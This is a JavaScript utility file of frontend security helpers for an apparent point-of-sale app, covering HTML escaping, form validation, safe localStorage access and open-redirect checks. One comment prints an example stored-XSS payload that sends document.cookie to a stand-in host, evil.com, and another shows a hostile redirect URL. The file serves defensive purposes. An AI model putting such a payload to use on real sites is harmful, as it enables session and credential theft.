/**
 * utils/security.js — Frontend security utilities
 *
 * PROTECTS AGAINST:
 *  - XSS: stored cross-site scripting via user-entered product names/notes
 *  - Token theft: safe localStorage usage with expiry tracking
 *  - Open redirect: safe navigation after login
 *  - Input injection: client-side field validation before API calls
 */

// ════════════════════════════════════════════════════════════
// XSS SANITIZATION
// ════════════════════════════════════════════════════════════

/**
 * Escape HTML special characters in a string.
 * Use when rendering any user-supplied text into innerHTML.
 *
 * PROTECTS AGAINST: Stored XSS — e.g. a product named:
 *   <script>document.location='https://evil.com?c='+document.cookie</script>
 *
 * React's JSX auto-escapes text content, so this is mainly needed for:
 *  - dangerouslySetInnerHTML (avoid it)
 *  - Dynamic strings passed to document.title
 *  - Print window HTML generation (receipt printer)
 */
export const escapeHtml = (str) => {
  if (typeof str !== 'string') return ''
  return str
    .replace(/&/g,  '&amp;')
    .replace(/</g,  '&lt;')
    .replace(/>/g,  '&gt;')
    .replace(/"/g,  '&quot;')
    .replace(/'/g,  '&#039;')
}

/**
 * Strip all HTML tags from a string.
 * Use for plain-text fields that should never contain markup.
 */
export const stripTags = (str) => {
  if (typeof str !== 'string') return ''
  return str.replace(/<[^>]*>/g, '').trim()
}

// ════════════════════════════════════════════════════════════
// INPUT VALIDATION (client-side — mirrors backend rules)
// ════════════════════════════════════════════════════════════

/**
 * Validate a login form before submitting to the API.
 * Returns { valid: true } or { valid: false, message: '...' }
 *
 * IMPORTANT: This is UX validation, NOT security validation.
 * The backend always re-validates. Never rely on frontend-only checks.
 */
export const validateLoginForm = ({ username, password }) => {
  if (!username?.trim()) return { valid: false, message: 'Username is required', field: 'username' }
  if (username.length > 30)  return { valid: false, message: 'Username too long', field: 'username' }
  if (!/^[a-zA-Z0-9_]+$/.test(username.trim())) {
    return { valid: false, message: 'Username contains invalid characters', field: 'username' }
  }
  if (!password) return { valid: false, message: 'Password is required', field: 'password' }
  if (password.length > 100) return { valid: false, message: 'Password too long', field: 'password' }
  return { valid: true }
}

/**
 * Validate a product form before submitting.
 */
export const validateProductForm = ({ name, price, stock, barcode }) => {
  if (!name?.trim())    return { valid: false, message: 'Product name is required', field: 'name' }
  if (name.length > 100) return { valid: false, message: 'Name cannot exceed 100 characters', field: 'name' }

  const p = parseFloat(price)
  if (price === '' || price === null || price === undefined) {
    return { valid: false, message: 'Price is required', field: 'price' }
  }
  if (isNaN(p) || p < 0) return { valid: false, message: 'Price must be a valid positive number', field: 'price' }
  if (p > 999999)        return { valid: false, message: 'Price is too high', field: 'price' }

  if (stock !== '' && stock !== null && stock !== undefined) {
    const s = parseInt(stock)
    if (isNaN(s) || s < 0) return { valid: false, message: 'Stock must be a whole number', field: 'stock' }
  }

  if (barcode?.trim() && !/^[a-zA-Z0-9\-]+$/.test(barcode.trim())) {
    return { valid: false, message: 'Barcode contains invalid characters', field: 'barcode' }
  }

  return { valid: true }
}

/**
 * Validate checkout cash input.
 */
export const validateCashInput = (cash, total) => {
  if (cash === '' || cash === null || cash === undefined) {
    return { valid: false, message: 'Cash amount is required' }
  }
  const num = parseFloat(cash)
  if (!Number.isFinite(num)) {
    return { valid: false, message: 'Enter a valid cash amount' }
  }
  if (num < 0) {
    return { valid: false, message: 'Cash cannot be negative' }
  }
  if (num < total) {
    return { valid: false, message: `Cash must be at least ₱${total.toFixed(2)}` }
  }
  return { valid: true, value: num }
}

// ════════════════════════════════════════════════════════════
// SAFE LOCAL STORAGE
// ════════════════════════════════════════════════════════════

/**
 * Safe localStorage wrapper with error handling.
 * localStorage can throw in private browsing mode or when storage is full.
 *
 * SECURITY NOTE on localStorage for JWT:
 *  - localStorage IS accessible to JavaScript — vulnerable to XSS that steals tokens
 *  - The alternative (httpOnly cookies) requires same-domain backend serving
 *  - For this MVP with Vite proxy, localStorage is acceptable
 *  - Mitigated by: React's auto-escaping, no dangerouslySetInnerHTML, CSP headers
 */
export const safeStorage = {
  get: (key) => {
    try { return localStorage.getItem(key) }
    catch { return null }
  },
  set: (key, value) => {
    try { localStorage.setItem(key, value); return true }
    catch { return false }
  },
  remove: (key) => {
    try { localStorage.removeItem(key) }
    catch { /* ignore */ }
  },
  getJSON: (key) => {
    try {
      const val = localStorage.getItem(key)
      return val ? JSON.parse(val) : null
    } catch { return null }
  },
  setJSON: (key, value) => {
    try { localStorage.setItem(key, JSON.stringify(value)); return true }
    catch { return false }
  },
}

// ════════════════════════════════════════════════════════════
// SAFE REDIRECT
// ════════════════════════════════════════════════════════════

/**
 * Validate a redirect path is safe (relative, not external).
 * PROTECTS AGAINST: Open redirect attacks via ?from=https://evil.com
 *
 * Usage: navigate(getSafeRedirect(location.state?.from?.pathname))
 */
export const getSafeRedirect = (path, fallback = '/') => {
  if (!path || typeof path !== 'string') return fallback
  // Only allow relative paths starting with /
  if (!path.startsWith('/') || path.startsWith('//')) return fallback
  // Block redirects to auth page itself
  if (path === '/login') return fallback
  return path
}
